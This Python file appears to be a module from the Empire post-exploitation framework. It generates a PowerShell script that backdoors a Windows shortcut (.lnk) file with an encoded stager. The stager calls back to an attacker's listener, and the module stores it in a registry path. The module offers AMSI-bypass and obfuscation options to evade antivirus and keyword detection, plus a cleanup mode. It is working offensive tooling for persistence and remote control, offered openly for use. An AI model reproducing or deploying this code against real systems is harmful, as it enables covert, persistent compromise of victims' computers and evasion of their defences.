from __future__ import print_function

import os

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False
        amsi_bypass = False
        amsi_bypass2 = False

        listener_name = params['Listener']

        # management options
        lnk_path = params['LNKPath']
        ext_file = params['ExtFile']
        cleanup = params['Cleanup']

        # storage options
        reg_path = params['RegPath']

        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']
        if (params['AMSIBypass']).lower() == 'true':
            amsi_bypass = True
        if (params['AMSIBypass2']).lower() == 'true':
            amsi_bypass2 = True

        status_msg = ""

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=False,
                                                               obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                               userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                               AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
            launcher = launcher.replace("$", "`$")


        # read in the common powerup.ps1 module source code
        module_source = main_menu.installPath + "/data/module_source/persistence/Invoke-BackdoorLNK.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        script = f.read()
        f.close()

        script_end = "Invoke-BackdoorLNK "
        
        if cleanup.lower() == "true":
            script_end += " -CleanUp"
            script_end += " -LNKPath '%s'" %(lnk_path)
            script_end += " -RegPath '%s'" %(reg_path)
            script_end += "; \"Invoke-BackdoorLNK cleanup run on lnk path '%s' and regPath %s\"" %(lnk_path,reg_path)
       
        else:
            if ext_file != '':
                # read in an external file as the payload and build a 
                #   base64 encoded version as encScript
                if os.path.exists(ext_file):
                    f = open(ext_file, 'r')
                    fileData = f.read()
                    f.close()

                    # unicode-base64 encode the script for -enc launching
                    encScript = helpers.enc_powershell(fileData)
                    status_msg += "using external file " + ext_file

                else:
                    print(helpers.color("[!] File does not exist: " + ext_file))
                    return ""

            else:
                # if an external file isn't specified, use a listener
                if not main_menu.listeners.is_listener_valid(listener_name):
                    # not a valid listener, return nothing for the script
                    print(helpers.color("[!] Invalid listener: " + listener_name))
                    return ""

                else:
                    # generate the PowerShell one-liner with all of the proper options set
                    launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
                                                                       obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
                                                                       userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                                       AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
                    
                    encScript = launcher.split(" ")[-1]
                    status_msg += "using listener " + listener_name

            script_end += " -LNKPath '%s'" %(lnk_path)
            script_end += " -EncScript '%s'" %(encScript)
            script_end += "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\"" %(lnk_path,listener_name)

        if obfuscate:
            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
